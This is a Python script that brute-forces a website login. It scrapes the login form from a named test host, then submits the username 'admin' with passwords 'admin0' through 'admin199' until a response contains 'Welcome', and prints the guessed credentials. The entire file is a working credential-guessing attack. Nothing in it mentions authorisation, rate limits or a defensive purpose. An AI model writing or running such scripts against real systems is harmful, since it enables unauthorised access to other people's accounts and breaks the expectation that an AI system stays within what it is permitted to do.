import requests
from bs4 import BeautifulSoup

# Function to generate password with 'admin' followed by a number
def generate_password(number):
    return f'admin{number}'

# URL of the login page
url = 'https://test.kevinschuit.com'

# Username
username = 'admin'

# Flag to track if login is successful
login_successful = False

# Send GET request to the login page
response = requests.get(url)

# Check if request was successful
if response.status_code == 200:
    # Parse the HTML content
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find the login form
    login_form = soup.find('form')

    # Extract form action URL
    form_action = login_form['action']

    # Loop through numbers until correct login is found
    for i in range(200):  # You can adjust the range as needed
        # Generate password
        password = generate_password(i)

        # Create payload with current username and password
        payload = {
            'username': username,
            'password': password
        }

        # Send POST request to authenticate
        response = requests.post(url + form_action, data=payload)

        # Check if authentication was successful
        if response.status_code == 200:
            # Check if the response contains expected content indicating successful login
            if 'Welcome' in response.text:
                print(f"Correct username and password found! Username: {username}, Password: {password}")
                login_successful = True
                break  # Break out of loop if correct combination found
            else:
                 print(f"Wrong infor found! Username: {username}, Password: {password}")

    # If login is not successful after trying all combinations
    if not login_successful:
        print(f"Failed to find correct username and password.")

else:
    print("Failed to retrieve login page.")